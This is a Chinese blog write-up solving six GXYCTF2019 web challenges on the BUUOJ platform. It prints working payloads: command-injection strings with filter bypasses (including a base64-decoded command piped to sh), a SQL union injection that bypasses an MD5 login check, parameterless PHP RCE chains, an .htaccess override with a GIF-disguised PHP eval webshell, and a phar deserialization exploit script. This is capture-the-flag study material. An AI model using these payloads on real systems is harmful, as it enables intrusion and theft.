---
title: BUUOJ-[GXYCTF2019]-WEB-WP
date: 2020-09-13 23:20:42
tags: CTF WEB
categories: CTF做题记录
---

>平台地址：https://buuoj.cn/

<!-- TOC -->

- [Ping Ping Ping](#ping-ping-ping)
- [BabySQli](#babysqli)
- [禁止套娃](#禁止套娃)
- [BabyUpload](#babyupload)
- [StrongestMind](#strongestmind)
- [BabysqliV3.0](#babysqliv30)
- [END](#end)

<!-- /TOC -->

<!--more-->
---
# Ping Ping Ping
>知识点：RCE，空格及过滤的一些基本绕过
>
提示GET ip，应该是RCE了，ls看看有啥
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912163953754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020091216431176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
尝试cat一下，发现过滤了空格，绕过一下，过滤了flag，哈哈看来不是这么简单啊，读一下源码吧
>空格绕过可以用这些字符：`< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、$IFS$1 等`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912164337702.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020091216472176.png#pic_center)
试了试好像只有`$IFS$9`可以用，过滤了挺多东西哈，不过解法还是挺多的，说两个常用的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912165448354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

- 内联执行```?ip=127.0.0.1;cat$IFS$9`ls` ```这个我也忘了看的那个大佬的wp了，感觉是奇淫技巧，就记下来了
>何为内联？反引号在linux作用是什么?
>反引号的作用是命令替换，shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出。这就是内联


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912170018615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

- 拼接字符`?ip=127.0.0.1;a=lag;b=f;cat$IFS$b$a.php`
注意，拼接时前面的赋值不能按flag的顺序赋值，如`a=f;b=lag`等。因为index.php的源码中有这么一句==```if(preg_match("/.*f.*l.*a.*g.*/", $ip))```这一句的意思就是判断有无按flag顺序出现的字符串
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912191213921.png#pic_center)
- 其他还有将命令进行base64编码，然后在终端里解码（```?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh```
）等等方法

---

# BabySQli
>知识点：md5密码查询的绕过
>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912192115422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
进去随手看看了源码（web手打开网站必做的事），发现有个==search.php==，点进去，看着是base家族的，base64解密失败，base32解密再64解密出了sql
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912192218227.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912193238144.png#pic_center)
那就是从usrname下手了，查查字段，试了下，user在第二列
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912195612924.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912195759737.png#pic_center)
常规注入似乎不得行，看了看[大佬的博客](https://www.cnblogs.com/gaonuoqi/p/12355035.html)发现这题考的是md5绕过，赵总没放提示，绕过md5可以用联合查询生成的虚拟表，将我们联合查询的东西插到结果中去，如下图
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912200046916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
这样就能构造payload了`name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#&pw=123`,后面的md5值就是123

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912200627568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

---
# 禁止套娃
>知识点：无参RCE，一些函数的绕过，RCE的骚姿势-session

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912203437269.png#pic_center)
源码没有东西，bp抓包也看不到啥，上扫描（赵总靶机有频率限制，所以加上了延时0.06S）！存在git泄露哦，嘿嘿嘿
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912204932579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912210152363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
啊这常用的为协议都被ban掉了啊，也是个RCE的题，参考大佬的博客吧。。。
>[博客一](https://yanmymickey.github.io/2020/03/16/CTF/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%20WP/) ，[博客二](https://www.cnblogs.com/wangtanzhi/p/12311239.html) ，[博客三](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE)，[Y1ng](https://www.gem-love.com/ctf/530.html?replytocom=5)
>配合食用效果更佳，大佬们tql
>![引自：Y#MD%00](https://img-blog.csdnimg.cn/20200912213003314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

这题是无参RCE，无参RCE的意思是只允许执行a(), a(b())这样的函数，而不允许带参数，比如a("b")是禁止的.
想读flag，那也带先知道文件名和文件路径噻，怎么读呢，用`scandir()`函数可以列出目录下文件，如```<?php print_r(scandir('.'))?>```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912212854576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
但是我们函数里面有个`‘.’`，怎么搞? `localeconv() `函数返回一包含本地数字及货币格式信息的数组，有点看不懂，试一试，注意第一个参数，是个点！再加上`current（）`函数(或者poc())，此函数返回数组中的当前元素的值，默认是第一个鸭，因为数组指针没动
>相关函数：
>end() - 将内部指针指向数组中的最后一个元素，并输出。
next() - 将内部指针指向数组中的下一个元素，并输出。
prev() - 将内部指针指向数组中的上一个元素，并输出。
reset() - 将内部指针指向数组中的第一个元素，并输出。
each() - 返回当前元素的键名和键值，并将内部指针向前移动。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200912213802160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913114407999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
这样就可以读取题目下都有啥文件啦，其实字典已经扫出来flag.php了，然后就是怎么读取的问题了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913115323573.png#pic_center)
上面介绍current()函数的时候介绍的相关函数就有用啦，但是用next()的话是第二个，用end()是最后一个，读不到倒数第二个的值，这时候就需要`array_reverse()`函数了，这是可以以相反的顺序返回数组，然后再用`next()`函数读取第二个值，试一试，读出来了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913131423592.png#pic_center)
怎么读内容呢？看源码发现`et`被ban掉了，那`ile_get_contents()`就用不了了，
不过可以用`readfile()`、`show_source()`、`highlight_file()`这三个函数替代，所以最终的payload就是
`?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913223422570.png#pic_center)
- **骚姿势**
sky师傅的一种思路
php默认是不主动使用session的，但是我们可以用通过``session_start()``告诉PHP使用session，session_id()可以获取到当前的session id，再手动设置cookie，如下，然后再读取内容就好了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913231557487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913231945391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

---

# BabyUpload
>知识点：.htaccess的妙用
>
先上传一个小马看看，==ph== 后缀的都被ban了。。。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916142612185.png#pic_center)
图片马试一试，凉凉，看看是什么服务，搞一个不存在的页面让它404
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916142737953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916143102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
apache的，那就用 ==.htaccess==让apache将所有上传的文件都当成php来执行，代码如下，上传记得用bp改文件类型
```htaccess
 SetHandler application/x-httpd-php
```
>何为.htaccess？
>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能
>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916143512494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
然后在传一个图片马就行，额一句话的🐎不行，应该是过滤了`<?`，那就用js引用，代码如下
```js
GIF89a?
<script language="php">eval($_POST['xxx']);</script>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916143631619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144038324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144147992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
- AntSword连一下就好
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144249764.png#pic_center)

- 不想用AntSword可以post`xxx=system('cat /flag')`，不过函数被ban了，但是还能用上题用的`show_source()`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144556253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144803665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916144920251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
---
# StrongestMind
>知识点：脚本练习，python，re
>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916145929588.png#pic_center)
还真是莫的感情啊，python脚本计算
[re教程](https://www.runoob.com/python/python-reg-expressions.html)
```python
import requests
import time
import re

url = "http://795c13f3-e110-4612-a26d-92f4d73b5398.node3.buuoj.cn"
s = requests.session()
exp = re.compile(r'[0-9]+ [+|-] [0-9]+')

res = s.get(url)
res.encoding = "utf-8"
data = {"answer":eval(exp.findall(res.text)[0])}//eval() 函数用来执行一个字符串表达式，并返回表达式的值。
res = s.post(url,data=data)
time.sleep(0.06)//靶机限制，延时

for i in range(1000):
    answer = eval(exp.findall(res.text)[0])
    data = {"answer":answer}
    res = s.post(url,data)
    res.encoding = "utf-8"
    print('{0}次提交：{1}'.format(i,answer))
    time.sleep(0.06)

print(res.text)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916154646548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

---
# BabysqliV3.0
>知识点：弱口令，LFI，phar反序列化
>官方WP：[https://gksec.com/GXY_CTF_WriteUp.html](https://gksec.com/GXY_CTF_WriteUp.html)

题目是sql，开始页面也是登录框，看源码有个u9db8，搜了一下也没看懂， 开始注入，各种方法都没用，看了看wp发现这根本不是sql。。。是个爆破界面，和上面那个注入一样，用户名是admin，爆破密码，注意设置线程，赵总靶机有访问限制，出密码了，登上看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916195944398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916200133402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
登上是个上传，但是URL感觉会有LFI，搞一下搞一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200916200702578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
源码：
```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传文件
	<input type="file" name="file" />
	<input type="submit" name="submit" value="上传" />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>
```
- `file_get_contents($uploader)`这行代码可以把我们上传的文件读出来，所以我们只需要将 ==$this->Filename== 等于flag.php就可以读出来flag（提一下，不晓得为啥只出来这一次，我在上传读取就变成了flag.php+文件内容，还望各位师傅指点迷津）
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921161839314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
- 官方做法：
   扫了一下，存在flag.php，访问一下被ban了
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921174822895.png#pic_center)
看upload源码发现析构函数里面有==eval== 函数，要想利用这个函数就需要`$this->token != $_SESSION['user']`，在构造函数里面可以看到正确上传文件后，文件名就是==SESSION== ，上传一个看看吧
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020092117591464.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921180312695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921180450793.png#pic_center)
但是，怎么利用呢？并没有cmd参数可以上传，所以，我也不晓得哈哈哈。
官方说的是用反序列化，但是本题并没有 `unserialize() `
>怎么反序列化？
>引用官方：PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，既然是打包文件，就肯定 会对相应的class进行序列化存储，再在执行某些函数或者需要调用数据的时候自动反序列化，很 多函数都可以自动反序列化phar文件，常见的莫过于 file_get_contents() 和 file_put_contents() ，具体哪些函数受影响请参考 [seaii 师傅的博客](https://paper.seebug.org/680/) 
>\
>- 此外，phar还有一个特点，无需特定的文件后缀，即使使用txt格式的后缀只要文件内容是phar的 格式即可被php识别为phar文件，可以利用这个feature上传txt文件构造反序列化
>- 现在只要构造一个phar反序列化文件，将命令替换为getﬂag操作，再把 检查的token替换为服务器分发的，后控制文件名进行反序列化操作，达到任意命令执行的目 的

在本地生成一个phar文件，注意：创建phar文件需要先将==php.ini== 中的==Phar.readonly== 设置为off，并去掉注释符号
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921191259160.png#pic_center)
```php
<?php
	class Uploader{
		public $Filename;
		public $cmd;
		public $token;
	}
	$o = new Uploader();
	$o->cmd = 'show_source("./flag.php");';
	$o->Filename = 'test';
	$o->token = 'GXY2deee2b530c9eab1ca630b4bb846d949';
	echo(serialize($o));

	$exp = new Phar("exp.phar");
	$exp->startBuffering();
	$exp->setStub("GIF89a"."<?php __halt_compiler();?>");//设置stub，并增加gif头
	$exp->setMetadata($o);//将自定义meta-data存入manifest
	$exp->addFromString("test.txt","test");
	$exp->stopBuffering();
?>
```
将生成的phar文件上传得到路径，将此路径作为==name== 参数，并带上`phar://`，这样 ==$this->Filename== 就被指定为phar，触发phar反序列化，导致命令执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921193511987.png#pic_center)
最后payload
`http://e056dfaa-4f83-4709-9d5b-8fcf86ecd67f.node3.buuoj.cn/upload.php?name=phar:///var/www/html/uploads/8d9d1997da800fb74165a46e7f667312/GXY2deee2b530c9eab1ca630b4bb846d949.txt`
再随意上传一个文件即可看到flag，额可惜复现失败，我也不晓得咋回事
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020092119551646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)

- [Y1ng师傅](https://www.gem-love.com/ctf/490.htm)的getshell
  upload的源码里面的正则，因为出题人为了代码美观，再`.`前面多了一个空格，所以正则匹配变成了匹配`%20.`，也就是没匹配。。。
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200921195749702.png#pic_center)
这个可以自行尝试，Y1ng师傅讲的也很清楚，不再赘述

---
# END
对于我这个菜鸡，这次的全家桶让我学到不少东西，继续淦
